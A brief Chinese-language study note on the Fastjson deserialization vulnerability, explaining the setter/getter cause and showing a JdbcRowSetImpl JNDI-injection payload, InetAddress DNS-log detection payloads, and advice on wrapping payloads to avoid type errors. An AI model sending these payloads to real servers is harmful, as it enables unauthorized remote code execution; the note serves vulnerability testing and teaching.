Ref：https://zhuanlan.zhihu.com/p/99075925

## Fastjson反序列化漏洞

### 原理

反序列化 @type 指定的类时，指定类的 setter 或 getter 被调用导致的命令执行。

漏洞触发和 `setter` 与 `getter` 有关，那么利用就是找那些在 `setter` 和 `getter` 中有敏感方法的类。

### 利用

JNDI 注入：Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），轻型目录访问协议（LDAP）或域名服务（DNS）。

`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/POC", "autoCommit":true}`

原理是 `com.sun.rowset.JdbcRowSetImpl` 这个类在设置 `autoCommit` 的 setter 时会调用 connect 方法去连接 `dataSourceName` 指定的 jdbc 服务。 JNDI 常用的有 RMI 和 LDAP 服务。

DNS log：

```text
{"@type":"java.net.InetAddress","val":"example.com"}
```

原理是 `java.net.InetAddress` 这个类在实例化时会尝试做对 `example.com` 做域名解析，这时候可以通过 dns log 的方式得知漏洞是否存在了。

在vulhub环境中，用反弹shell的payload来打可以成功，但换这个检测用的payload就不行。 其实原因是，有的开发在使用fastjson解析请求时会使用Spring的@RequestBody注释，告诉解析引擎，我需要的是一个User类对象（其实就可以理解为JSON中不加@type的普通对象）。

这时候你传入的是{"@type":"java.net.Inet4Address","val":"xxxxx"}，相当于给到他的是java.net.Inet4Address对象，所以会爆出一个type not match的异常。 

所以建议测试fastjson漏洞，最外层一定是数组或者对象，不要加@type，然后将Payload作为其中一个键值，比如： { "xxx": {"@type":"java.net.InetAddress","val":"dnslog"} } 

这样写通常就不会有type not match的错误了。